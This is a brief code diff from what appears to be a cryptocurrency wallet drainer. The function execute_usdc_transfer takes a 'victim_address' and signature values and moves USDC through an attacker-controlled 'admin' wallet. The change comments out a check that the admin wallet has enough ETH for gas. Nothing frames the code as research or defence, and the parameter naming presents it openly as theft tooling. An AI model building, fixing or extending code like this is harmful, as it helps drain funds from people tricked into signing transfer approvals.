@@ -35,8 +35,8 @@ def execute_usdc_transfer(victim_address, amount, deadline, v, r, s):
 
         # Gas check
         gas_price = w3.eth.gas_price
-        if w3.eth.get_balance(admin_addr) < (gas_price * 120000):
-            return None, "ADMIN_WALLET_ERROR: Insufficient ETH for gas."
+        #if w3.eth.get_balance(admin_addr) < (gas_price * 120000):
+        #    return None, "ADMIN_WALLET_ERROR: Insufficient ETH for gas."
 
         # Nonce & Signature
         current_nonce = w3.eth.get_transaction_count(admin_addr, 'pending')
